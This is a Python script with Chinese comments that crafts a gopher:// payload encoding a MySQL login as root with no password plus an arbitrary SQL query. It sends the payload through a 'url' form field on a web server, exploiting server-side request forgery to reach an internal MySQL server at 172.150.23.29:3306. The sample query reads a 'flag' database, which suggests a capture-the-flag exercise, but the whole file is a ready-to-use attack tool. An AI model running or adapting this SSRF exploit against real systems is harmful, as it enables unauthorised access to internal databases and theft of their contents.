# 本脚本用于生成 未授权mysql的gopher格式命令
import sys
import binascii
import requests
import urllib.parse


def query_to_uri(query):
    user = "root"

    beginning = "3c00000105a60f00000000010800000000000000000000000000000000000000000000"
    gap = "00"
    ending = "0100000001"

    hex_user = user.encode("u8").hex()
    passwd = "mysql_native_password"
    hex_passwd = passwd.encode("u8").hex()
    res1 = beginning + gap + hex_user + gap * 2 + hex_passwd + gap
    hex_query = query.encode("u8").hex()
    query_len = "{:06x}".format((int((len(hex_query) / 2) + 1)))
    query_length_bytes = bytes.fromhex(query_len)[::-1]
    query_len = binascii.hexlify(query_length_bytes).decode("utf-8")

    print("query_len:", query_len)
    res2 = query_len + gap + "03" + hex_query

    res = res1 + res2 + ending
    r = len(res)
    uri = ["%".join(res[i : i + 2] for i in range(0, len(res), 2))]
    uri1 = "%" + uri[0]
    print("--hex:", res)
    print("--uri:", uri)
    # with open("temp.txt", "w+") as f:
    #     f.write(uri)
    uri2 = urllib.parse.quote("%" + uri[0])
    print("--二次编码: ", uri2)
    return uri2


query = "use flag;select * from test;"  # <- 此处替换命令

uri = query_to_uri(query)
url = "http://192.168.0.0:9080"  # 测试站点
headers = {"Content-Type": "application/x-www-form-urlencoded"}
data = f"url=gopher://172.150.23.29:3306/_{uri}"  # 数据库地址
r = requests.post(url, headers=headers, data=data)
print(r.text)
